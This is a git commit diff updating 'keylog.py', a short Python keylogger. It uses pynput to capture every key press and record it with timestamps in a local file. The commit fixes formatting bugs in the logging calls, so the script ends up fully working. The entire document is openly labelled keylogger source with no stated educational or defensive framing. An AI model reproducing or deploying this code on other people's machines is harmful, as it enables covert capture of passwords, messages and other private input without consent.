bb9d1b6e5f2f913ea437bb567a9a16f8a40b0eb5
Julian-Enable <elabc80@gmail.com>
2023-09-19 21:48:09 -0500

    Update keylog.py

--- keylog.py
+++ keylog.py
@@ -1,11 +1,10 @@
 from pynput.keyboard import Listener
 import logging
 
-logging.basicConfig(filename='result.keylogger', level=logging.DEBUG, format="%(asctime)s: %(message)s'")
+logging.basicConfig(filename='result.keylogger', level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
 def keystroke(key):
-
-    logging.info("se ha pulsado la tecla: {0}",format(key))
+    logging.info("se ha pulsado la tecla: %s", key)
 
 with Listener(on_press=keystroke) as input_keyboard:
     input_keyboard.join()
